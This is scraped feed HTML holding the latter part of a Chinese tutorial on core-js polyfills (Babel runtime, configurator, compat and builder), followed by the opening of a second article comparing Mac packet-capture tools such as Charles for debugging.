<span class="hljs-comment">// chrome 50 生成代码 </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.array.iterator.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.map.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.try.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-collections.iterator.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});

<span class="hljs-comment">// chrome 100 生成代码 </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.try.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});
</code></pre>
<p>可以看到，源代码中增加了Promise.try，引入的特性也随之增加了对应的core-js特性引入。因此，使用@babel/preset-env的usage配置，可以保证兼容性的同时，最小化引入core-js特性。另外这个配置并不会自动引入提议特性，如果需要则额外配置proposals为true。</p>
<h3 data-id="heading-17">@babel/polyfill</h3>
<p>@babel/polyfill是一个已经被弃用的包，推荐直接使用core-js/stable。查看@babel/polyfill源码，发现他就是引入了core-js特性与regenerator-runtime这个包。regenerator-runtime也是一个兼容性相关的包，可以帮助添加generatore和async/await相关语法。作为替代可以这样引入：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/stable'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'regenerator-runtime/runtime'</span>;
</code></pre>
<h3 data-id="heading-18">@babel/runtime</h3>
<p>@babel/runtime就像自动引入版的core-js-pure。它还是根据代码实际使用的特性来注入core-js特性，但它不注入到全局，而是引入这些API再调用。这里我们使用@babel/plugin-transform-runtime插件，里面包含了@babel/runtime相关逻辑。首先看下Babel配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"plugins"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">"@babel/plugin-transform-runtime"</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>再转义上一节中的代码，结果如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 源代码</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span>{});

<span class="hljs-comment">// 生成代码</span>
<span class="hljs-keyword">import</span> _Promise <span class="hljs-keyword">from</span> <span class="hljs-string">"@babel/runtime-corejs3/core-js-stable/promise"</span>;
<span class="hljs-keyword">import</span> _Map <span class="hljs-keyword">from</span> <span class="hljs-string">"@babel/runtime-corejs3/core-js-stable/map"</span>;
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title function_">_Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title function_">_Map</span>();
_Promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});
</code></pre>
<p>可以看到，虽然没有直接引入core-js-pure，但效果是一样的。打开@babel/runtime-corejs3这个包查看，里面实际上就是导出了core-js-pure中的特性。例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// @babel/runtime-corejs3/core-js-stable/map.js 文件内容</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-pure/stable/map"</span>);
</code></pre>
<h2 data-id="heading-19">core-js/configurator强制控制</h2>
<p>如果希望在正常引入core-js时，对于部分特殊属性进行引入或者不引入的控制，就需要用到core-js/configurator。这个工具可以配置三种选项：</p>
<ul>
<li>useNative: 当环境中有这个特性时不引入，当确定没有时才引入</li>
<li>usePolyfill: 明确引入这个特性</li>
<li>useFeatureDetection: 默认行为，和不使用core-js/configurator一致</li>
</ul>
<h3 data-id="heading-20">useNative不引入</h3>
<p>首先试试不引入特性，这里我们使用Promise这个特性为例。首先是不引入core-js的效果，可以看到全局Promise对象被我们改掉了。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* 输出结果
{} true
*/</span>
</code></pre>
<p>然后在中间引入core-js试试。可以看到我们改掉的Promise，被core-js给改回去了。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* 输出结果
[Function: Promise] false
*/</span>
</code></pre>
<p>这时候，如果不希望core-js改掉我们自定义的Promise，可以利用useNative配置，强制core-js不引入这个特性。看结果core-js引入之后，我们自定义的Promise依然存在。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> configurator = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/configurator"</span>);
<span class="hljs-title function_">configurator</span>({
  <span class="hljs-attr">useNative</span>: [<span class="hljs-string">"Promise"</span>],
});
<span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* 输出结果
{} true
*/</span>
</code></pre>
<h3 data-id="heading-21">usePolyfill强制引入</h3>
<p>想要验证usePolyfill的效果，需要找一个环境中本来存在的特性，core-js即使引入也不会修改的特性。Promise不行，因为core-js引入时会对这个Promise增加子特性。Promise.try也不行，因为原来环境中不存在。这里试一下Promise.any，这是环境中本来就存在的特性：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* 输出结果
[Function: any]
[Function: jzplp] true
*/</span>
</code></pre>
<p>可以看到，Promise.any原来就存在，但是被我们修改成了新函数。再引入core-js试试：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* 输出结果
[Function: any]
[Function: jzplp] true
*/</span>
</code></pre>
<p>引入了core-js之后，结果没有变化。这说明core-js并不会修改我们自定义的函数。这时候就可以试一下usePolyfill的效果了：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> configurator = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/configurator"</span>);
<span class="hljs-title function_">configurator</span>({
  <span class="hljs-attr">usePolyfill</span>: [<span class="hljs-string">"Promise.any"</span>],
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* 输出结果
[Function: any]
[Function: any] false
*/</span>
</code></pre>
<p>可以看到，Promise.any又被改为了真正起效果的函数，这说明usePolyfill的强制引入特性是有效的。</p>
<h2 data-id="heading-22">core-js中的特性选择</h2>
<p>前面我们体验了Babel根据浏览器兼容性，选择不同的core-js特性引入，那么不同浏览器兼容哪些特性的数据是从哪里获取呢？core-js本身就提供了这个功能。</p>
<h3 data-id="heading-23">core-js-compat</h3>
<p>core-js-compat提供了不同浏览器对应特性的兼容性数据。它有好几个参数，这里先列举一下含义：</p>
<ul>
<li>targets: Browserslist格式的浏览器兼容配置</li>
<li>modules: 需要设置兼容性配置的模块，可以是core-js/full，也可以是某个特性，甚至是正则</li>
<li>exclude: 需要排除的模块</li>
<li>version: 使用的core-js版本</li>
<li>inverse: 反向输出，即输出不需要兼容的特性列表</li>
</ul>
<p>这里举几个例子试一下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* 输出结果
{
  list: [
    'es.iterator.concat',
    'es.math.sum-precise',
    'es.async-iterator.async-dispose',
    'esnext.array.group',
    'esnext.array.group-by',
    ...其它特性
  ],
  targets: {
    'es.iterator.concat': { 'chrome-android': '143' },
    'es.math.sum-precise': { 'chrome-android': '143' },
    'es.async-iterator.async-dispose': { 'chrome-android': '143' },
    'esnext.array.group': { 'chrome-android': '143' },
    'esnext.array.group-by': { 'chrome-android': '143' },
    ...其它特性
  }
}
*/</span>
</code></pre>
<p>compat会根据我们设置的浏览器兼容性配置，输出特性列表，包含两个字段：list是一个特性名称列表；targets是一个Map结构，key为特性名，值为可以兼容的浏览器。假设我们把上面的 targets改成 &gt; 50%，此时会输出空值：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 50%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* 输出结果
{ list: [], targets: {} }
*/</span>
</code></pre>
<p>我们增加exclude，排除部分属性，可以看到特性数量大大减少：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">exclude</span>: [<span class="hljs-string">"esnext"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* 输出结果
{
  list: [
    'es.iterator.concat',
    'es.math.sum-precise',
    'es.async-iterator.async-dispose',
    'web.dom-exception.stack',
    'web.immediate',
    'web.structured-clone'
  ],
  targets: {
    'es.iterator.concat': { 'chrome-android': '143' },
    'es.math.sum-precise': { 'chrome-android': '143' },
    'es.async-iterator.async-dispose': { 'chrome-android': '143' },
    'web.dom-exception.stack': { 'chrome-android': '143' },
    'web.immediate': { 'chrome-android': '143' },
    'web.structured-clone': { 'chrome-android': '143' }
  }
}
*/</span>
</code></pre>
<p>再试一下inverse的效果：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
  <span class="hljs-attr">inverse</span>: <span class="hljs-literal">true</span>
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* 输出结果
{
  list: [
    'es.symbol',
    'es.symbol.description',
    ...其它特性
  ],
  targets: {
    'es.symbol': {},
    'es.symbol.description': {},
    ...其它特性
  }
}
*/</span>
</code></pre>
<p>因为输出的是不需要引入core-js兼容的特性，所以特性数量非常多，而且targets中没有列出支持的浏览器版本。</p>
<h3 data-id="heading-24">core-js-builder</h3>
<p>前面介绍的core-js-compat是接收参数之后，输出core-js的特性列表数组。而core-js-builder接收类似的参数，直接输出引用core-js的代码。我们首先列举一下参数：</p>
<ul>
<li>targets: Browserslist格式的浏览器兼容配置</li>
<li>modules: 需要设置兼容性配置的模块，可以是core-js/full，也可以是某个特性，甚至是正则</li>
<li>exclude: 需要排除的模块</li>
<li>format: 'bundle'输出打包后的源码；'cjs'和'esm'输出对应格式的引用代码</li>
<li>filename: 输出的文件名</li>
</ul>
<p>我们先试一下例子。首先是format格式的：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> builder = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-builder"</span>);
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">funJzplp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">builder</span>({
    <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 30%"</span>,
    <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
    <span class="hljs-attr">format</span>: <span class="hljs-string">'bundle'</span>,
  });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
}
<span class="hljs-title function_">funJzplp</span>();

<span class="hljs-comment">/* 输出结果
...代码很长，这里节选部分
 (function(module, exports, __webpack_require__) {
"use strict";
var NATIVE_BIND = __webpack_require__(8);
var FunctionPrototype = Function.prototype;
*/</span>
</code></pre>
<p>可以看到，builder函数输出了非常长的代码，内容实际为输出的特性经过打包之后的结果代码。再试一下'cjs'和'esm'，输出的是对应木块的引用代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// format: 'cjs' 输出结果</span>
...代码很长，这里节选部分
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.iterator.concat'</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.math.sum-precise'</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.async-iterator.async-dispose'</span>);
*/

<span class="hljs-comment">// format: 'esm' 输出结果</span>
...代码很长，这里节选部分
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.iterator.concat.js'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.math.sum-precise.js'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.async-iterator.async-dispose.js'</span>;
*/
</code></pre>
<p>如果设置了filename，core-js-builder会创建该名称的文件，并将代码写入到文件中。</p>
<h2 data-id="heading-25">总结</h2>
<p>这篇文章描述了core-js相关包的代码内容和使用方式。core-js实际上就是提供了JavaScript中一些API特性的兼容实现方式。它与实现语法兼容的Babel一起，可以做到大部分JavaScript的兼容性。当然core-js和Babel也不是万能的，它们都有各自无法转义和兼容的语法和特性。</p>
<p>core-js这个包名字起的非常好，一听就是JavaScript的“核心”包。由于它实现了很多API特性，而且引用数量非常非常大，因此叫“核心”也不为过。虽然这个包引用量很大，但不如React/Vue或者一些其它包出名。因为这个包是处理的更底层的兼容性有问题，因此用户感知不强。core-js包的作者还因为没有钱而遇到很多问题，这个包并没有让他变的富有。</p>
<h2 data-id="heading-26">参考</h2>
<ul>
<li>core-js 文档<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcore-js.io%2F" target="_blank" title="https://core-js.io/" ref="nofollow noopener noreferrer">core-js.io/</a></li>
<li>Github core-js<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js" target="_blank" title="https://github.com/zloirock/core-js" ref="nofollow noopener noreferrer">github.com/zloirock/co…</a></li>
<li>解锁Babel核心功能：从转义语法到插件开发<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fjzplp.github.io%2F2025%2Fbabel-intro.html" target="_blank" title="https://jzplp.github.io/2025/babel-intro.html" ref="nofollow noopener noreferrer">jzplp.github.io/2025/babel-…</a></li>
<li>@babel/preset-env 文档<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-preset-env" target="_blank" title="https://babeljs.io/docs/babel-preset-env" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-…</a></li>
<li>@babel/polyfill 文档<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-polyfill" target="_blank" title="https://babeljs.io/docs/babel-polyfill" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-…</a></li>
<li>@babel/runtime 文档<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-runtime" target="_blank" title="https://babeljs.io/docs/babel-runtime" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-…</a></li>
<li>Github regenerator-runtime<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Fregenerator%2Ftree%2Fmain%2Fpackages%2Fruntime" target="_blank" title="https://github.com/facebook/regenerator/tree/main/packages/runtime" ref="nofollow noopener noreferrer">github.com/facebook/re…</a></li>
<li>Github core-js-compat<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fpackages%2Fcore-js-compat" target="_blank" title="https://github.com/zloirock/core-js/blob/master/packages/core-js-compat" ref="nofollow noopener noreferrer">github.com/zloirock/co…</a></li>
<li>Github core-js-builder<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Ftree%2Fmaster%2Fpackages%2Fcore-js-builder" target="_blank" title="https://github.com/zloirock/core-js/tree/master/packages/core-js-builder" ref="nofollow noopener noreferrer">github.com/zloirock/co…</a></li>
<li>So, what's next?<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fdocs%2F2023-02-14-so-whats-next.md" target="_blank" title="https://github.com/zloirock/core-js/blob/master/docs/2023-02-14-so-whats-next.md" ref="nofollow noopener noreferrer">github.com/zloirock/co…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Mac 抓包软件有哪些？Charles、mitmproxy、Wireshark和Sniffmaster哪个更合适]]></title>    <link>https://juejin.cn/post/7597452210646302720</link>    <guid>https://juejin.cn/post/7597452210646302720</guid>    <pubDate>2026-01-21T09:27:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597452210646302720" data-draft-id="7597483279270445071" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Mac 抓包软件有哪些？Charles、mitmproxy、Wireshark和Sniffmaster哪个更合适"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-21T09:27:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开心猴爷"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Mac 抓包软件有哪些？Charles、mitmproxy、Wireshark和Sniffmaster哪个更合适
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开心猴爷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:27:39.000Z" title="Wed Jan 21 2026 09:27:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果只是想“看一下请求”，Mac 上的选择其实很多。
但当需求开始变得具体，比如要抓 iOS App、要看 HTTPS、要改请求内容，工具之间的差异才真正显现出来。</p>
<p>我自己在 Mac 上抓包，往往不是一开始就决定用哪个软件，而是先想清楚几个问题：
是抓浏览器流量，还是抓本机程序？
是调接口，还是分析异常？
有没有 iOS 设备参与？</p>
<p>这些问题，直接决定了工具是否合适。</p>
<hr/>
<h2 data-id="heading-0"><strong>Charles：最容易上手，但也最容易卡住</strong></h2>
<p>在 Mac 上，Charles 往往是很多人的第一站。</p>
<p>如果只是抓浏览器或者普通 App：</p>
<ul>
<li>安装后启动</li>
<li>打开 macOS 的网络代理</li>
<li>访问目标页面</li>
</ul>
<p>HTTP 请求几乎立刻就能看到。</p>
<p>但一旦涉及 HTTPS，或者抓 iOS App，步骤就会明显变多：</p>
<ul>
<li>安装 Charles 根证书</li>
<li>在 macOS 钥匙串里设为信任</li>
<li>iOS 设备上再装一份证书</li>
<li>Wi-Fi 代理手动配置</li>
</ul>
